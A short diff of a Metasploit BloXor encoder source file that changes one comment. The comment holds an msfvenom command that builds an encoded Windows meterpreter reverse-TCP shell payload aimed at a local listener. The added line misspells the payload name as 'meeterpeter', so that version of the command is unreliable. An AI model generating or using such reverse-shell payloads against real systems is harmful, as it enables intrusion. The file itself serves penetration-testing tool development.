@@ -21,7 +21,7 @@ require 'rex/encoder/bloxor/bloxor'
 # http://census-labs.com/media/packing-heat.pdf
 #
 # Manually check the output with the following command:
-# >ruby msfvenom -p windows/meterpreter/reverse_tcp RHOST=192.168.2.2 LHOST=192.168.2.1 LPORT=80 -a x86 -e x86/bloxor -b '\x00' -f raw | ndisasm -b32 -k 128,1 -
+# >ruby msfvenom -p windows/meeterpeter/reverse_tcp RHOST=192.168.2.2 LHOST=192.168.2.1 LPORT=80 -a x86 -e x86/bloxor -b '\x00' -f raw | ndisasm -b32 -k 128,1 -
 #
 
 class Metasploit3 < Rex::Encoder::BloXor
